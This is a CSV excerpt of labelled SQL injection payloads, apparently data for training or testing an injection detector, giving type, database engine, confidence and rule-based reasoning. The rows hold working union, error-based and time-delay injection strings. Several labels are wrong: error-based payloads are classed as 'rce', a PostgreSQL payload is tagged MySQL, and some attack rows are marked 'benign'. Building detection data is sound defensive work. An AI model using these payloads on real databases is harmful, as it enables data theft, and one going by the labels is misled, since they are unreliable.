row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1636,"1 ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 4510 = 4510",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1637,"1'|| ( select 'svgd' from dual where 5188 = 5188 union all select null,null,null,null,null#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
1638,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zenl' like 'zenl",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1639,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""mmsh"" = ""mmsh",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1640,"-5052 ) ) ) union all select 8351,8351,8351,8351#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1641,"select * from generate_series ( 4465,4465,case when ( 4465 = 6232 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
1642,"1"" ) as gdcx where 2335 = 2335 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1643,1'+ ( select 'feof' where 1966 = 1966,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1644,"1"" rlike sleep ( 5 ) and ""veub"" = ""veub",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1645,"-3169"" order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1646,"1 ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1647,waitfor delay '0:0:5' and 'dfzn' = 'dfzn,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1648,"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
1649,"-6597'+ ( select aewz where 4036 = 4036 union all select 4036,4036,4036,4036,4036,4036,4036--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
